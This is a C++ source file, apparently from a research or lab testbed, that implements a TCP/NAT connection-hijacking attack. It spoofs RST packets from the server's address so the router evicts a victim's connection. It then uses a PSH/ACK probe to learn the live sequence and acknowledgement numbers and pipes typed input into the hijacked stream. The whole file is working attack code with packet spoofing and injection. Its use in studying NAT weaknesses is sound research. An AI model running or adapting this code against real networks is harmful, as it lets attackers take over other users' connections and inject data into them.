#include <cstdint>
#include <iostream>
#include <limits>
#include <optional>
#include <random>
#include <thread>

#include <poll.h>

#include "tcp-interface.hpp"
#include "tcp-packet.hpp"

#include "app.hpp"

namespace {

// Send a packet, honoring the delay and redundancy settings
void send_pkt(Configuration &config, const TCPPacket &packet);

} // namespace

int main(int argc, char **argv) {

  // Get the values for this run
  Configuration config = Configuration::args(argc, argv);

  // Compute the attacker and router address given the configuration and the
  // current port
  TCPPacket::Address attacker_addr{
      .ip = config.topology.attacker_ip,
      .port = config.port,
  };
  TCPPacket::Address router_addr{
      .ip = config.topology.router_ip,
      .port = config.port,
  };

  // Get a random number for the initial sequence numbers on the server side.
  // Remember to seed with a real random number generator.
  std::random_device rd;
  std::default_random_engine isn_engine{rd()};
  std::uniform_int_distribution<uint32_t> isn_dist{ 
      0, std::numeric_limits<uint32_t>::max() / 2};
  uint32_t server_isn = isn_dist(isn_engine);
  uint32_t attacker_isn = isn_dist(isn_engine);
  uint32_t garbage_ack = isn_dist(isn_engine);

  std::cout << "Sending RST to router to evict connection." << std::endl;

  // Spoof RST packets to the router from the server
  send_pkt(config, TCPPacket{
                       .src = config.topology.server_addr,
                       .dst = router_addr,
                       .seqno = server_isn,
                       .ackno = garbage_ack,
                       .rst = true,
                   });

  // Send a second RST in the other half of the 4G space
  // in case the router has extra checks
  send_pkt(config, TCPPacket{
                       .src = config.topology.server_addr,
                       .dst = router_addr,
                       .seqno = server_isn + std::numeric_limits<uint32_t>::max() / 2,
                       .ackno = garbage_ack,
                       .rst = true,
                   });

  std::cout << "Sleeping until connection evicted." << std::endl;

  // Wait for the NAT to evict the victim's connection
  std::this_thread::sleep_for(config.router_timeout);

  std::cout << "Getting true seqno and ackno with garbage PSH/ACK." << std::endl;
  // Reset the mapping with PSH/ACK, arbitrary seqno
  send_pkt(config, TCPPacket{
                       .src = attacker_addr,
                       .dst = config.topology.server_addr,
                       .seqno = attacker_isn,
                       .ackno = garbage_ack,
                       .psh = true,
                   });

  // Check response for correct seqno, ack
  std::optional<TCPPacket> response = config.topology.interface.receive(
      [](const TCPPacket &pkt) -> bool {
        // Ignore reset packets
        return !pkt.rst;
      },
      config.timeout);
  
  if (!response.has_value()) {
    std::cout << "Error in evicting connection: no response to PSH/ACK." << std::endl;
  } else {
    uint32_t true_ackno = response->seqno;
    uint32_t true_seqno = response->ackno.value();
    std::cout << "Got seqno: " << true_seqno << ", ackno: " << true_ackno << std::endl;

    std::cout << "Enabling netcat..." << std::endl;
    // Sending to server only for now
    for (std::string line; std::getline(std::cin, line);) {
      send_pkt(config, TCPPacket{
                  .src = attacker_addr,
                  .dst = config.topology.server_addr,
                  .seqno = true_seqno,
                  .ackno = true_ackno,
                  .psh = true,
                  .data = line + "\n",
              });

      std::optional<TCPPacket> tcp_response = config.topology.interface.receive(
      [](const TCPPacket &pkt) -> bool {
        // No filter
        return true;
      },
      config.timeout);
      if (tcp_response.has_value()) {
        // Success case only for now
        true_seqno = tcp_response->ackno.value();
      }
    }
    // End stream
    send_pkt(config, TCPPacket{
                      .src = attacker_addr,
                      .dst = config.topology.server_addr,
                      .seqno = true_seqno,
                      .ackno = true_ackno,
                      .fin = true,
                  });
  }
}

namespace {

void send_pkt(Configuration &config, const TCPPacket &packet) {
  for (size_t i = 0; i < config.packet_redundancy; i++) {
    config.topology.interface.send(packet);
    std::this_thread::sleep_for(config.packet_delay);
  }
}

} // namespace
